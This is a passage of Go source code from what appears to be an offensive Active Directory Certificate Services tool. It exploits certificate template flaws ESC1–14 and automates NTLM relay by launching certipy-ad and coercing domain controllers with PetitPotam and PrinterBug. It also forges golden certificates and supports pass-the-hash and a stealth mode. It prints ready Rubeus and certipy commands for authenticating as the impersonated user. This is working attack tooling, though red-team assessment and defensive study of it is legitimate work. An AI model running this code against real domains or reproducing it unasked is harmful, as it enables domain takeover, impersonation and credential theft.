		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc11Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		f := esc11Findings[0]

		listenerIP, _ := cmd.Flags().GetString("listener-ip")
		listenerPort, _ := cmd.Flags().GetInt("listener-port")
		if listenerIP == "" {
			return fmt.Errorf("--listener-ip is required for automated coercion")
		}

		targetURL := fmt.Sprintf("rpc://%s", f.CAHostname)
		if err := runAutomatedRelay(cfg, targetURL, f.CAName, templateName, listenerIP, listenerPort); err != nil {
			return err
		}
		return nil
	case "14":
		victimDN, _ := cmd.Flags().GetString("victim-dn")
		if victimDN == "" {
			return fmt.Errorf("--victim-dn is required for ESC14 exploitation")
		}
		cert, certKey, err = pki.ExploitESC14(ctx, cfg, conn, templateName, victimDN)
	default:
		return fmt.Errorf("unsupported ESC: %s (supported: 1-14)", exploit)
	}

	if err != nil {
		return fmt.Errorf("exploitation failed: %w", err)
	}

	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	basePath := output
	for _, ext := range []string{".pem", ".crt", ".key", ".pfx"} {
		basePath = strings.TrimSuffix(basePath, ext)
	}

	// Always write PEM files
	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write cert: %w", err)
	}
	// Also write PFX for direct certipy/Rubeus use
	pfxPath := basePath + ".pfx"
	if err := pki.WritePFX(cert, certKey, pfxPath, pfxPassword); err != nil {
		fmt.Printf("[!] PFX export failed: %v\n", err)
	}

	if cfg.OutputJSON {
		result := pki.ExploitResult{
			Exploit:   strings.ToUpper(exploit),
			Template:  templateName,
			TargetUPN: upn,
			CertPath:  basePath + ".crt",
			KeyPath:   basePath + ".key",
			PFXPath:   basePath + ".pfx",
			Success:   true,
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	// Detect whether we got a CA-signed cert or fell back to self-signed
	selfSigned := cert.Issuer.CommonName == cert.Subject.CommonName

	if selfSigned {
		fmt.Printf("\n[!] OFFLINE MODE — certificate is self-signed (CA enrollment failed)\n")
		fmt.Printf("    This cert will NOT authenticate against a real domain controller.\n")
		fmt.Printf("    To get a CA-signed cert, ensure the CA's web enrollment (/certsrv/) is reachable.\n")
	} else {
		fmt.Printf("\n[+] Exploitation successful — CA-signed certificate obtained!\n")
	}
	fmt.Printf("    Exploit:  ESC%s\n", escID)
	fmt.Printf("    Template: %s\n", templateName)
	fmt.Printf("    UPN:      %s\n", upn)
	fmt.Printf("    Issuer:   %s\n", cert.Issuer.CommonName)
	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
	if !selfSigned {
		fmt.Printf("\n[*] Authenticate with the certificate:\n")
		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, cfg.Domain)
		sam := upn
		if idx := strings.Index(sam, "@"); idx > 0 {
			sam = sam[:idx]
		}
		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt", sam, pfxPath)
		if pfxPassword != "" {
			rubeusCmd += fmt.Sprintf(" /password:%s", pfxPassword)
		}
		fmt.Printf("    %s\n", rubeusCmd)
	}
	return nil
}

func runAutoDetect(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	vulnerable, err := pki.AutoDetectESC(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("auto-detect: %w", err)
	}

	if cfg.OutputJSON {
		data, _ := json.MarshalIndent(vulnerable, "", "  ")
		fmt.Println(string(data))
		return nil
	}

	if len(vulnerable) == 0 {
		fmt.Println("[*] No vulnerable templates detected.")
		return nil
	}

	fmt.Printf("\n[+] Found %d vulnerable template(s) — prioritized attack paths:\n\n", len(vulnerable))
	for i, t := range vulnerable {
		fmt.Printf("  %d. [Score: %d] %s\n", i+1, t.ESCScore, t.Name)
		fmt.Printf("     Vulnerabilities: %s\n", strings.Join(t.ESCVulns, ", "))
		if t.EnrolleeSuppliesSubject {
			fmt.Println("     → Enrollee can supply subject (critical for impersonation)")
		}
		if t.AuthenticationEKU {
			fmt.Println("     → Has authentication EKU (can be used for domain auth)")
		}
		fmt.Println()
	}
	return nil
}

func runImportPFX(cmd *cobra.Command, pfxPath string) error {
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	outputJSON, _ := cmd.Flags().GetBool("json")

	if outputJSON {
		info, err := pki.LoadPFXInfo(pfxPath, pfxPassword)
		if err != nil {
			return fmt.Errorf("load PFX: %w", err)
		}
		data, err := json.MarshalIndent(info, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	_, _, err := pki.LoadPFX(pfxPath, pfxPassword)
	if err != nil {
		return fmt.Errorf("load PFX: %w", err)
	}
	return nil
}

func runReport(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for report generation")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	reportFormat, _ := cmd.Flags().GetString("format")
	if reportFormat == "" {
		reportFormat = "markdown"
	}

	output, _ := cmd.Flags().GetString("output")
	if output == "" {
		output = "findings.md"
	}

	fmt.Printf("[*] Running full ADCS enumeration for report...\n")
	result, err := pki.EnumerateAll(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	reportData, err := pki.GenerateReport(result, reportFormat)
	if err != nil {
		return fmt.Errorf("generate report: %w", err)
	}

	if err := os.WriteFile(output, reportData, 0600); err != nil {
		return fmt.Errorf("write report: %w", err)
	}

	fmt.Printf("[+] Report written to %s (%d bytes)\n", output, len(reportData))
	fmt.Printf("    Format:    %s\n", reportFormat)
	fmt.Printf("    Templates: %d\n", len(result.Templates))
	fmt.Printf("    Findings:  %d\n", result.VulnCount)
	return nil
}

func init() {
	rootCmd.AddCommand(pkiCmd)

	// Action flags
	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
	pkiCmd.Flags().String("esc", "", "Exploit ESC vulnerability (1-14, e.g. --esc 1)")
	pkiCmd.Flags().String("exploit", "", "Alias for --esc")
	pkiCmd.Flags().MarkHidden("exploit")
	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
	pkiCmd.Flags().String("theft", "", "Certificate theft playbook (1-5 or all)")
	pkiCmd.Flags().String("cert-theft", "", "Alias for --theft")
	pkiCmd.Flags().MarkHidden("cert-theft")

	// Connection flags
	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
	pkiCmd.Flags().StringP("username", "u", "", "Domain username (user or user@domain)")
	pkiCmd.Flags().StringP("password", "p", "", "Domain password for LDAP authentication")
	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
	pkiCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
	pkiCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
	pkiCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
	pkiCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
	pkiCmd.Flags().Bool("ldaps", false, "Use LDAPS (port 636)")
	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade plaintext LDAP to TLS)")

	// Certificate flags
	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
	pkiCmd.Flags().String("ca-key", "", "Path to CA private key PEM file")
	pkiCmd.Flags().String("ca-cert", "", "Path to CA certificate PEM file (with --ca-key, enables golden certificate mode)")
	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
	pkiCmd.Flags().String("ca", "", "Target CA name for ESC7 exploitation")
	pkiCmd.Flags().String("attacker-dn", "", "Attacker sAMAccountName or LDAP DN for ESC9 (e.g., 'attacker' — DN auto-built from --domain)")
	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion)")
	pkiCmd.Flags().Int("listener-port", 0, "Relay listener port (>1024 for non-admin pivot; uses WebDAV/HTTP instead of SMB)")
	pkiCmd.Flags().Int("relay-port", 8080, "Local port for built-in NTLM relay server (ESC8)")
	pkiCmd.Flags().Int("relay-timeout", 120, "Seconds to wait for NTLM relay connection (ESC8)")
	pkiCmd.Flags().String("victim-dn", "", "Target user LDAP DN for ESC14 explicit mapping")

	// Output flags
	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
	pkiCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
	pkiCmd.Flags().String("format", "markdown", "Report format (markdown)")

	// Operational flags
	pkiCmd.Flags().Bool("stealth", false, "Enable stealth mode: random delays between queries, smaller page sizes")
	pkiCmd.Flags().Int("timeout", 10, "Network timeout in seconds for LDAP/HTTP/RPC connections")
}

func runAutomatedRelay(cfg *pki.ADCSConfig, targetURL, caName, templateName, listenerIP string, listenerPort int) error {
	fmt.Printf("[*] Starting automated relay: certipy-ad relay -target %s -ca %q -template %s\n", targetURL, caName, templateName)
	cmd := exec.Command("certipy-ad", "relay", "-target", targetURL, "-ca", caName, "-template", templateName)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start certipy-ad (is it installed in PATH?): %w", err)
	}
	
	defer func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
	}()
	
	time.Sleep(3 * time.Second)
	
	fmt.Printf("\n[*] Triggering coercion: %s → %s:%d\n", cfg.TargetDC, listenerIP, listenerPort)
	if err := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam, cfg); err != nil {
		fmt.Printf("[!] PetitPotam failed: %v\n", err)
		if err2 := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePrinterBug, cfg); err2 != nil {
			fmt.Printf("[!] PrinterBug also failed: %v\n", err2)
		}
	}
	
	fmt.Println("\n[*] Waiting up to 15 seconds for relay to complete...")
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()
	
	select {
	case <-done:
		fmt.Println("[+] Relay process exited.")
	case <-time.After(15 * time.Second):
		fmt.Println("[*] Stopping relay process (timeout)...")
		cmd.Process.Kill()
	}
	return nil
}
